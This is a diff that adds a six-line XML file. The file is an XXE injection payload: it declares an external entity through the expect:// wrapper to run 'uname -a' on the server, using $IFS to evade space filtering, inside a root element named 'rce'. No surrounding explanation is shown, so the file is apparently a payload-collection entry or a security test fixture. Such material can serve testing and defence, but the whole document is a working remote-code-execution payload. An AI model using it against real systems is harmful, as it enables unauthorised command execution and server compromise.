@@ -1,0 +1,6 @@
+<!DOCTYPE rce [
+<!ENTITY xxe SYSTEM "expect://uname$IFS-a">
+]>
+<rce>
+    <data>&xxe;</data>
+</rce>
